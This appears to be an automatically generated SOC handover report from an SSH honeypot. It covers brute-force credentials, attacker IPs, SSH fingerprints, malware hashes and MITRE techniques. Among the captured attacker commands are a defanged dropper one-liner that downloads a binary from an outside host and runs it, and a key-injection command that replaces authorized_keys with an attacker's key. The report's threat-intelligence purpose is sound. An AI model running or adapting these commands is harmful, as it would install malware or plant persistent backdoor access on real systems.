# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-04 |
| **Generated At** | 2026-05-04T19:46:14Z |
| **Shift Time** | 19:46 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **342** |
| Confirmed Threats | **226** |
| False Positives Filtered | **116** (33.9%) |
| Unique Attacker IPs | **21** |
| Countries of Origin | **15** |
| High Severity Cases | **7** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **335** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **80** |
| Unique Credential Pairs | **43** |
| Unique Usernames | **23** |
| Unique Passwords | **38** |
| Successful Auth Pairs | **7** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 14 |
| `admin` | 14 |
| `root` | 9 |
| `administrator` | 4 |
| `oracle` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `root` | 5 |
| `1234567` | 4 |
| `password` | 3 |
| `steam!` | 3 |
| `test123` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `steam` | `steam!` | 3 |
| `nico` | `test123` | 3 |
| `admin` | `pass` | 3 |
| `postgres` | `ubuntu` | 3 |
| `user` | `default` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `password` | `146.56.224.203` | 2026-05-04T18:12:20 |
| `root` | `admin0.0` | `103.143.11.168` | 2026-05-04T18:39:00 |
| `root` | `3245gs5662d34` | `103.143.11.168` | 2026-05-04T18:39:06 |
| `root` | `admin0.0` | `103.229.125.106` | 2026-05-04T18:45:58 |
| `root` | `3245gs5662d34` | `103.229.125.106` | 2026-05-04T18:46:01 |
| `root` | `` | `118.178.225.236` | 2026-05-04T19:36:19 |
| `root` | `` | `192.42.116.101` | 2026-05-04T19:36:22 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **342** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 94 |
| OpenSSH | 9 |
| Unknown | 1 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 64 | 2 |
| `03a80b21afa8...` | Modern SSH client | 30 | 1 |
| `c118de82e19e...` | Mirai/variant | 9 | 1 |
| `1b8acd46a07d...` | Modern SSH client | 1 | 1 |
| `087ab61de4f8...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 64 | 2 | libssh-based |
| `03a80b21afa8...` | libssh | 30 | 1 | Modern SSH client |
| `c118de82e19e...` | OpenSSH | 9 | 1 | Mirai/variant |
| `1b8acd46a07d...` | Unknown | 1 | 1 | Modern SSH client |
| `087ab61de4f8...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.229.125.106`, `103.143.11.168`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **21** |
| Unique ASNs | **20** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 1 | HIGH |
| `AS24544` | Overcasts Limited | 1 | HIGH |
| `AS27947` | Telconet S.A | 1 | HIGH |
| `AS215125` | Church of Cyberology | 1 | HIGH |
| `AS396982` | Google LLC | 1 | LOW |
| `AS138152` | YISU CLOUD LTD | 1 | HIGH |
| `AS134756` | CHINANET Nanjing Jishan IDC network | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (7)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-fa2979034115

| Field | Detail |
|---|---|
| **Source IP** | `146.56.224[.]203` |
| **First Seen** | 2026-05-04 18:12 |
| **Last Seen** | 2026-05-04 18:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 1 > /dev/null && cat /bin/echo, nohup $SHELL -c "curl hxxp://8.222.174[.]150:60111/arm_linux -o /tmp/MnaWISLMp6; if [ ! -f /tmp/MnaWISLMp6 ]; then wget hxxp://8.222.174[.]150:60111/arm_linux -O /tmp/MnaWISLMp6; fi; if [ ! -f /tmp/MnaWISLMp6 ]; then exec 6<>/dev/tcp/8.222.174[.]150/60111 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/MnaWISLMp6 ; chmod +x /tmp/MnaWISLMp6 && /tmp/MnaWISLMp6 GEEFf7llYqNmAFNje1gIcqFnZqd4EVl7Z1MDZqZgY7l5BFFvY1EAeaZ3ZqN+H1Rje1MDfLllZ6RyB1FkZFENGLYokLjvB2CHeVjPww==; fi; echo password > /tmp/.opass; chmod +x /tmp/M, head -c 2299668 > /tmp/0zgAMo9CW2, d(, head -c 2299668 > /tmp/0zgAMo9CW2uUPX!` |
| **TTPs (MITRE)** | T1078 · T1083 · T1105 · T1110.001 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 18:12:19` | `cowrie.session.connect` |
| `2026-05-04 18:12:19` | `cowrie.client.version` |
| `2026-05-04 18:12:19` | `cowrie.client.kex` |
| `2026-05-04 18:12:19` | `cowrie.login.failed` |
| `2026-05-04 18:12:20` | `cowrie.login.success` |
| `2026-05-04 18:12:21` | `cowrie.session.params` |
| `2026-05-04 18:12:21` | `cowrie.command.input` |
| `2026-05-04 18:12:24` | `cowrie.command.input` |
| `2026-05-04 18:12:24` | `cowrie.command.input` |
| `2026-05-04 18:12:24` | `cowrie.command.input` |
| `2026-05-04 18:12:24` | `cowrie.command.failed` |
| `2026-05-04 18:12:24` | `cowrie.command.input` |
| `2026-05-04 18:12:24` | `cowrie.command.input` |
| `2026-05-04 18:12:24` | `cowrie.log.closed` |
| `2026-05-04 18:12:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.224[.]203` to AbuseIPDB if not already reported
- [ ] Block `146.56.224[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c1988d38da9

| Field | Detail |
|---|---|
| **Source IP** | `103.143.11[.]168` |
| **First Seen** | 2026-05-04 18:38 |
| **Last Seen** | 2026-05-04 18:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 18:38:59` | `cowrie.session.connect` |
| `2026-05-04 18:38:59` | `cowrie.client.version` |
| `2026-05-04 18:38:59` | `cowrie.client.kex` |
| `2026-05-04 18:39:00` | `cowrie.login.success` |
| `2026-05-04 18:39:01` | `cowrie.session.params` |
| `2026-05-04 18:39:01` | `cowrie.command.input` |
| `2026-05-04 18:39:01` | `cowrie.command.failed` |
| `2026-05-04 18:39:01` | `cowrie.log.closed` |
| `2026-05-04 18:39:02` | `cowrie.session.params` |
| `2026-05-04 18:39:02` | `cowrie.command.input` |
| `2026-05-04 18:39:02` | `cowrie.session.file_download` |
| `2026-05-04 18:39:02` | `cowrie.log.closed` |
| `2026-05-04 18:39:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.11[.]168` to AbuseIPDB if not already reported
- [ ] Block `103.143.11[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b9785dfdc79

| Field | Detail |
|---|---|
| **Source IP** | `103.143.11[.]168` |
| **First Seen** | 2026-05-04 18:39 |
| **Last Seen** | 2026-05-04 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 18:39:05` | `cowrie.session.connect` |
| `2026-05-04 18:39:05` | `cowrie.client.version` |
| `2026-05-04 18:39:05` | `cowrie.client.kex` |
| `2026-05-04 18:39:06` | `cowrie.login.success` |
| `2026-05-04 18:39:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.11[.]168` to AbuseIPDB if not already reported
- [ ] Block `103.143.11[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-694a1993812f

| Field | Detail |
|---|---|
| **Source IP** | `103.229.125[.]106` |
| **First Seen** | 2026-05-04 18:45 |
| **Last Seen** | 2026-05-04 18:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 18:45:57` | `cowrie.session.connect` |
| `2026-05-04 18:45:57` | `cowrie.client.version` |
| `2026-05-04 18:45:57` | `cowrie.client.kex` |
| `2026-05-04 18:45:58` | `cowrie.login.success` |
| `2026-05-04 18:45:58` | `cowrie.session.params` |
| `2026-05-04 18:45:58` | `cowrie.command.input` |
| `2026-05-04 18:45:58` | `cowrie.command.failed` |
| `2026-05-04 18:45:58` | `cowrie.log.closed` |
| `2026-05-04 18:45:58` | `cowrie.session.params` |
| `2026-05-04 18:45:58` | `cowrie.command.input` |
| `2026-05-04 18:45:58` | `cowrie.session.file_download` |
| `2026-05-04 18:45:58` | `cowrie.log.closed` |
| `2026-05-04 18:46:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.229.125[.]106` to AbuseIPDB if not already reported
- [ ] Block `103.229.125[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1339c96205d4

| Field | Detail |
|---|---|
| **Source IP** | `103.229.125[.]106` |
| **First Seen** | 2026-05-04 18:46 |
| **Last Seen** | 2026-05-04 18:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 18:46:00` | `cowrie.session.connect` |
| `2026-05-04 18:46:00` | `cowrie.client.version` |
| `2026-05-04 18:46:00` | `cowrie.client.kex` |
| `2026-05-04 18:46:01` | `cowrie.login.success` |
| `2026-05-04 18:46:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.229.125[.]106` to AbuseIPDB if not already reported
- [ ] Block `103.229.125[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16409124c1a0

| Field | Detail |
|---|---|
| **Source IP** | `118.178.225[.]236` |
| **First Seen** | 2026-05-04 19:36 |
| **Last Seen** | 2026-05-04 19:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 19:36:19` | `cowrie.session.connect` |
| `2026-05-04 19:36:19` | `cowrie.client.version` |
| `2026-05-04 19:36:19` | `cowrie.client.kex` |
| `2026-05-04 19:36:19` | `cowrie.login.success` |
| `2026-05-04 19:36:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.178.225[.]236` to AbuseIPDB if not already reported
- [ ] Block `118.178.225[.]236` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f322eea25a8

| Field | Detail |
|---|---|
| **Source IP** | `192.42.116[.]101` |
| **First Seen** | 2026-05-04 19:36 |
| **Last Seen** | 2026-05-04 19:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo "bash --help; ls /proc/1/; cat /proc/1/mounts; cat /proc/cpuinfo; echo __1777923384147739975" | sh, bash --help; ls /proc/1/; cat /proc/1/mounts; cat /proc/cpuinfo; echo __1777923384147739975
` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 19:36:20` | `cowrie.session.connect` |
| `2026-05-04 19:36:20` | `cowrie.client.version` |
| `2026-05-04 19:36:20` | `cowrie.client.kex` |
| `2026-05-04 19:36:22` | `cowrie.login.success` |
| `2026-05-04 19:36:23` | `cowrie.client.size` |
| `2026-05-04 19:36:23` | `cowrie.session.params` |
| `2026-05-04 19:36:24` | `cowrie.command.input` |
| `2026-05-04 19:36:24` | `cowrie.command.input` |
| `2026-05-04 19:36:24` | `cowrie.command.input` |
| `2026-05-04 19:36:29` | `cowrie.log.closed` |
| `2026-05-04 19:36:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.42.116[.]101` to AbuseIPDB if not already reported
- [ ] Block `192.42.116[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `91.204.208[.]73` | **111** | 2026-05-04 18:56 | 2026-05-04 19:18 | 66m | 0 | `T1592` | 🟠 MEDIUM |
| `103.143.11[.]168` | **30** | 2026-05-04 18:13 | 2026-05-04 18:49 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.229.125[.]106` | **30** | 2026-05-04 18:09 | 2026-05-04 18:47 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `121.229.191[.]90` | **30** | 2026-05-04 18:07 | 2026-05-04 19:18 | 52m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.178.225[.]236` | **9** | 2026-05-04 19:36 | 2026-05-04 19:36 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `186.5.72[.]30` | **3** | 2026-05-04 18:59 | 2026-05-04 19:10 | 1m | 0 | `T1592` | 🟢 LOW |
| `161.132.52[.]19` | **2** | 2026-05-04 17:51 | 2026-05-04 18:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `157.245.192[.]73` | 1 | 2026-05-04 19:02 | 2026-05-04 19:02 | 30s | 0 | `T1592` | 🟢 LOW |
| `211.219.254[.]187` | 1 | 2026-05-04 18:33 | 2026-05-04 18:33 | 13s | 0 | `T1592` | 🟢 LOW |
| `88.208.200[.]117` | 1 | 2026-05-04 19:20 | 2026-05-04 19:20 | 31s | 0 | `T1592` | 🟢 LOW |
| `94.29.124[.]154` | 1 | 2026-05-04 18:11 | 2026-05-04 18:13 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 40/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `88.208.200[.]117` | GB | Fasthosts Internet Limited | **100** ⚠️ | 1 |
| `186.5.72[.]30` | EC | Telconet S.A | **100** ⚠️ | 0 |
| `118.178.225[.]236` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 7 |
| `161.132.52[.]19` | PE | Red Cientifica Peruana | **100** ⚠️ | 0 |
| `211.219.254[.]187` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `94.29.124[.]154` | RU | Moscow Local Telephone Network (OAO MGTS) | **100** ⚠️ | 9 |
| `157.245.192[.]73` | SG | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `192.42.116[.]101` | NL | TOR EXIT AND MORE | **100** ⚠️ | 50 |
| `103.229.125[.]106` | HK | Overcasts Limited | **100** ⚠️ | 32 |
| `103.143.11[.]168` | US | HONG KONG ACEMOB TECHNOLOGY CO., LIMITED | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 105 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 73 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 7 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 2 |

---

## 🔕 False Positive Summary (116 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 112 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 342 cases |
| Tool 34  | Credential Extractor        | ✅ 80 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 21 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 116 filtered (33.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 7 priority case(s) shown individually · 11 recon entry/entries in table (7 group(s) consolidating 215 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-04T19:46:14Z_
